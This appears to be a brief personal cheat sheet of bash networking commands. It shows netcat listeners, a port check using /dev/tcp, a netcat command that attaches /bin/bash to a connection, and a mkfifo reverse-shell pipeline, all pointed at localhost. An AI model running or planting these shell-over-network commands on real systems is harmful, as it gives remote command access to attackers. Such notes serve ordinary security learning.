## Networking
### Tunneling
```bash
nc -vlnp 4444
nc localhost 4444 -e /bin/bash

timeout 0.5 echo 2>/dev/null < /dev/tcp/localhost/80 && echo "open" || echo "closed"

timeout 0.5 echo < /dev/tcp/localhost/80 && echo "open" || echo "closed"
```
### Reverse shell
```bash
mkfifo /tmp/gustavo
ls -lh /tmp/

cat /tmp/gustavo | /bin/sh -i 2>&1 | nc -l localhost 4444 > /tmp/gustavo

nc localhost 4444

ls -lh /tmp/
```
